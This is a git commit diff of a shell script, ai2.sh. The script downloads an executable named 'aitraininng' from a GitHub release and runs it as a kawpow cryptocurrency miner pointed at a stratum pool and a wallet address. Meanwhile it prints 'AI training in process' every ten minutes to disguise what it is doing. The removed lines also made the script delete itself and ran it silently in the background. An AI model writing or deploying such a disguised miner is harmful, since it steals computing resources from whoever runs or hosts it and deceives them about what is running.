7da814ec333c31bf194d53811537348af551f6ae
max313iq <153689278+max313iq@users.noreply.github.com>
2024-11-30 12:08:07 +0300

    Update ai2.sh

--- ai2.sh
+++ ai2.sh
@@ -1,11 +1,16 @@
 #!/bin/bash
-nohup bash -c "
-  ( sleep 1; rm -- \"$0\" ) &
-  wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng
-  chmod +x aitraininng
-  ./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch &
-" > /dev/null 2>&1 &
+
+# Download the file
+wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng
+
+# Make the file executable
+chmod +x aitraininng
+
+# Run the file with the given parameters
+./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch &
+
+# Print "AI training in process" every 10 minutes
 while true; do
     echo "AI training in process"
-    sleep 600 
+    sleep 600
 done
